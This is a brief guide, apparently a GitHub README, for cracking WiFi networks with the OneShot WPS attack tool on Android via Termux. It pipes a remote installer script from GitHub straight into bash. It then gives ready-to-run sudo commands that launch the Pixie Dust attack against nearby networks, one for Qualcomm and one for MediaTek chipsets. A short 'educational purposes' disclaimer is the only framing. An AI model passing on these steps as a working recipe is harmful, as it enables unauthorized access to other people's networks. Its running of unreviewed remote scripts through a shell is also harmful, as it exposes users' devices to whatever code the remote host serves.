# Cracker WiFi Using Termux

This document provides a straightforward guide on using a WiFi Cracker tool with the Termux. It's intended for educational purposes only. Ensure you have permission to test on the network you're targeting.

## Getting Started

### Prerequisite
- Termux installed on your device.

### Installation and Usage

1. **Install Termux**
   Begin by ensuring the Termux is installed on your device. You can find it on F-Droid or GitHub.

***Note:*** Don't use the Play Store version as it is no longer maintained.

2. **Upgrade Packages**
   Open Termux and upgrade the packages to ensure you're working with the latest versions.
   ```bash
   pkg upgrade
   ```

3. **Update Packages**
   Next, update the package lists to fetch the latest available versions of the packages.
   ```bash
   pkg update
   ```

4. **Install WiFi Cracker**
   Download and execute the installer script for the WiFi Cracker tool using curl.
   ```bash
   curl -sSf https://raw.githubusercontent.com/drygdryg/OneShot_Termux_installer/master/installer.sh | bash
   ```
   If the installation process halts or fails, simply rerun the command to attempt the installation again.

5. **Disable WiFi/Data Connection**
   Ensure your device's WiFi or data connection is turned off to prevent interference during the cracking process.

6. ***Execute the CMD***
   Run the appropriate command based on your device's chipset.

   - ***For Qualcomm (qcom) chipsets:***
     ```bash
     sudo python OneShot/oneshot.py -i wlan0 --iface-down -K
     ```

   - ***For MediaTek (mtk) chipsets:***
     ```bash
     sudo python OneShot/oneshot.py -i wlan0 --mtk-wifi --iface-down -K
     ```

## Disclaimer
This guide is for educational purposes only. Always have explicit permission before attempting to test any network. Unauthorized access to networks is illegal and unethical.

